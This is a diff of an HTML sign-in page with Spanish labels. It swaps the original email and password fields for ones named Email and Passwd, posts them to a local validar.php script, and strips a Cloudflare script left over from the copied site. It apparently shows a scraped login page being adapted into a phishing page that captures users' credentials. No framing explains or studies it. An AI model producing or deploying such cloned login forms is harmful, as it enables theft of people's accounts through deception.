@@ -62,21 +62,26 @@
             <input type="hidden" name="form_origin" id="form_origin" value="hc" />
             <div class="credentials">
               <form name="signIn" method="post" novalidate action="validar.php" class="auth-validate-form auth-clearable-form">
+                  
+                  
+                  <label class="hidden-label" for="Email">Correo</label>
+<input id="Email" name="Email" type="email"
+       placeholder="Email"
+       value=""
+       spellcheck="false"
+       class="">
+<label class="hidden-label" for="Passwd">Contraseña</label>
 
-              <label for="user_email">Correo electrónico</label>
-              <input autofocus="autofocus" autocomplete="on" type="email" name="user[email]" id="user_email" />
-              <label for="user_password">Contraseña</label>
-              <input autocomplete="off" type="password" name="user[password]" id="user_password" />
-            </div>
-
-              <div class="remember">
+<input id="Passwd" name="Passwd" type="password"
+       placeholder="Contraseña"
+       class="">
+        <div class="remember">
                 <input type="checkbox" name="remember_me" id="remember_me" value="1" />
                 <label for="remember_me">Mantenerse conectado</label>
               </div>
+<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Ingresar">
+       
 
-            <div class="clear"></div>
-
-            <input type="submit" name="commit" value="Iniciar sesión" id="sign-in-submit-button" class="c-btn c-btn--primary auth-actions" />
 </form>
             <div class="clear"></div>
         </div>
@@ -114,6 +119,5 @@
   </div>
 </div>
 
-
-<script type="text/javascript">(function(){window['__CF$cv$params']={r:'5c9a5bf2aa80e964',m:'916410097127e39e28417a2a4ad7a4cf771788e8-1598579193-1800-AV++5wraxiccOW0Ev6Ztjh3W+TU2ydZpnNIHx00CBYVPRq8fdHZk/cfSIWNv1VKY0TCif34Iz7R2OjL7AAMMdmNgCLMvGE5sfOXhzS5uvA4vBlJL8zdDqvIwLCv4GpMwUxc3jadRbj5Rd5Q7xyK5WZvduPXlYTT4mYjLyMGVx/GpKtrIach2ocHGtOeC1ZXcNtNIOsHw3IGoLnTx2qKanx0i+s4UKsWHEsYzfa2dBFffys2rpCPcUrd+uQyJsKWnvAMIR34NGSZXf1ZPSuStarn7HjrDB1ATWlibObFBduG0bLuNK5gP0qx37Q92gqVJSWH4nwCnso7Dahg7+1LBm0E=',s:[0xbf80586e96,0xe865472e4f],}})();</script></body>
+</body>
 </html>
